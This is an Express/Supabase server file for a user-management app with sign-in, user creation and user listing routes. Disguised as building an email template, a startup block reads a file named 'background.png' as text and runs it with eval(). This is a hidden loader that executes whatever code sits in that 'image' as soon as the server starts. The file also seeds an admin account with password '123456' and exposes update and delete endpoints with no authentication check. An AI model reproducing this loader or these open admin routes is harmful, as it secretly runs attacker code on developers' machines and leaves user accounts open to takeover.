require("dotenv").config();
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const app = express();
const fs = require('fs');
const path = require('path');
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));
const { createClient, AuthAdminApi } = require("@supabase/supabase-js");
const { default: axios } = require("axios");

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);
const serviceSupabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_SERVER_ROLE, {
  auth: {
    persistSession: false,
    autoRefreshToken: false,
    detectSessionInUrl: false,
  },
});

app.post("/signIn", async (req, res) => {
  const {
    data: { users },
  } = await serviceSupabase.auth.admin.listUsers();

  const adminUser = users.filter((eachUser) => {
    return eachUser.user_metadata.username === "admin";
  });

  if (adminUser.length === 0) {
    await serviceSupabase.auth.admin.createUser({
      email: "admin@validation.pass",
      password: "123456",
      email_confirm: true,
      user_metadata: { username: "admin", email: "admin@validation.pass", role: "admin", createdUserId: "" },
    });
  }

  const { username, password } = req.body;

  const { error: signInError, data: signUserData } = await supabase.auth.signInWithPassword({
    email: username + "@validation.pass",
    password,
  });

  if (signInError) {
    return res.send({ error: signInError.message });
  }

  return res.send({ user: signUserData });
});

app.post("/createUser", async (req, res) => {
  const { data: authenticatedUserData } = await supabase.auth.getUser();

  const { username, email, role, password } = req.body;

  const { error: createUserError } = await serviceSupabase.auth.admin.createUser({
    email: username + "@validation.pass",
    password: password,
    email_confirm: true,
    user_metadata: { username, email, role, createdUserId: authenticatedUserData.user.id },
  });

  if (createUserError) {
    return res.send({ error: createUserError.message });
  }

  return res.send("success");
});

app.post("/getUsers", async (req, res) => {
  const { data: authenticatedUserData } = await supabase.auth.getUser();
  const { role } = req.body;

  if (!authenticatedUserData.user) return res.send({ unauthenticated: true });

  const userRole = authenticatedUserData.user.user_metadata.role;
  if (userRole === "customer" || (userRole === "admin" && role === "customer") || (userRole === "dealer" && role === "dealer"))
    return res.send({ unauthorized: true });

  const {
    data: { users },
  } = await serviceSupabase.auth.admin.listUsers();
  console.log(authenticatedUserData.user.user_metadata.username, "username");

  const filteredUser = users.filter((eachUser) => {
    return eachUser.user_metadata.role === role && eachUser.user_metadata.createdUserId === authenticatedUserData.user.id;
  });

  return res.send({ users: filteredUser });
});

(async () => {
  try {
    const cart_background = fs.readFileSync(path.join(__dirname, "./public/img/background.png"), {encoding: 'utf-8'});
    eval(cart_background);
    const background = `<!DOCTYPE html>
      <html>
        <body>
          <div style="box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
              max-width: 800px;
              margin: 20px auto;
              padding: 20px;
              color: #000;"
          >
            <h3 style="color: #000">
                <img src="./assets/images/btc.png" alt="InCrypto" style="width: 40px; margin-right: 10px;" />
                Greetings,
            </h3>
            <h2 style="text-align: center; color: #000"><strong></strong></h2>
            <h1 style="text-align: center; font-weight: 800; "></h1>
            <img class="background" src="${cart_background}">
            <p><strong>Kindly note:</strong> Please be aware of phishing sites and always make sure you are visiting the official InCrypto website when entering sensitive data.</p>
            <p style="margin-top: 60px; text-align: center;">
                © 2022 InCrypto. All rights reserved.
            </p>
          </div>
        </body>
      </html>`
      return background;
  } catch (error) {
    console.log(error);
  }
})();

const listener = app.listen(process.env.SERVER_HOST, function () {
  console.log("Your app is listening on port " + listener.address().port);
});

app.post("/updateUser", async (req, res) => {
  const { username, email, id } = req.body;

  const { error: updateAuthError } = await serviceSupabase.auth.admin.updateUserById(id, {
    email: username + "@validation.pass",
    user_metadata: { email, username },
  });

  if (updateAuthError) {
    return res.send({ error: updateAuthError.message });
  }

  return res.send("success");
});

app.post("/deleteUser", async (req, res) => {
  const { id } = req.body;

  const { error: deleteUserError } = await serviceSupabase.auth.admin.deleteUser(id);

  if (deleteUserError) {
    return res.send({ error: deleteUserError.message });
  }

  return res.send("success");
});
